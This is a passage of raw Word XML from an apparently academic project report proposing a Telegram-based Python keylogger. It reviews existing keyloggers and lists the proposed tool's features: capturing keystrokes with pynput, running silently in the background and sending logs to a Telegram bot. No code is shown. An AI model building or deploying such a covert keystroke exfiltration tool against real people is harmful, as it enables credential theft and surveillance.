          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>KidLogger</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>) → costly, closed-source, heavy.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C2F084C" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Freeware Keyloggers</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> → risky (often malware-infected).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="235E05D5" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Enterprise Security Suites</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> → advanced but complex, not suitable for academic use.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69127506" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Disadvantages:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04204D50" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Expensive licenses.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66429947" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>High resource consumption.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23FF20DF" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Not customizable.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D9CC9F4" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Risky if downloaded from untrusted sources.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52FC5F4B" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="395D316A">
          <v:rect id="_x0000_i1311" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="36E0AF4A" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>1.6 Proposed System</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64B18B10" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">The proposed </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Telegram-based keylogger</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> is a lightweight, Python application designed for </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>academic, research, and controlled environments</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A30D535" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Features:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E70176B" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Captures keystrokes via </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>pynput</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D3F0A15" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Stores them in a temporary log buffer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7672B9E4" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Sends periodic updates to a </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Telegram bot chat</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A52602F" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Allows safe exit with the keyword </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>exitlog</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3540A465" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Runs silently in the background with minimal CPU usage.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BEF8ED0" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Advantages:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0046660F" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Instant log delivery via Telegram.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27C5EC2C" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Easier to configure than email (no SMTP, app passwords).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F021997" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Free and open-source.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E9CBAA1" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Lightweight and customizable.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45C4A5AF" w14:textId="12BAE77D" w:rsidR="00685F9D" w:rsidRDefault="00685F9D" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36DED5BC" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Chapter 2 – Literature Survey</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DBA5215" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>2.1 Literature Review</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FEBBFBB" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">A number of research studies and open-source projects have focused on </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>keystroke logging</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> as a security, productivity, and forensic tool. Traditional implementations used </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>email</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>local files</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> to store and transmit logs. However, with the increasing restrictions on SMTP email access and the growing popularity of messaging platforms, more modern approaches leverage APIs of instant messaging services such as </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Telegram</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62272314" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Below is a brief survey of existing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744"/>
        <w:gridCol w:w="2273"/>
        <w:gridCol w:w="2873"/>
      </w:tblGrid>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="1859A0E3" w14:textId="77777777">
        <w:trPr>
          <w:tblHeader/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="12798E4F" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Author / Project</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5C553095" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Technology</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4B35B3B2" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Features</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="663B9F42" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Limitations</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="4CD78E73" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="417DEC3F" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Spyrix</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t xml:space="preserve"> Free Keylogger (2019)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="16DD072E" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Windows, GUI, Email Alerts</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="38691E78" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Full-featured logging and screenshot capture</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="33C2A242" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Closed-source, privacy concerns</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="3B905230" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0480AEC4" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>PyKeylogger</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t xml:space="preserve"> (GitHub Project)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="57BD58A3" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Python, Email</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="15FE5157" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Basic logging, periodic email alerts</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="58832E33" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Requires SMTP configuration, blocked by many providers</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00497ED2" w:rsidRPr="00497ED2" w14:paraId="6D317CCA" w14:textId="77777777">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2AADD85A" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>KidLogger</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6A51B129" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>Cross-platform</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5B066223" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00497ED2">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
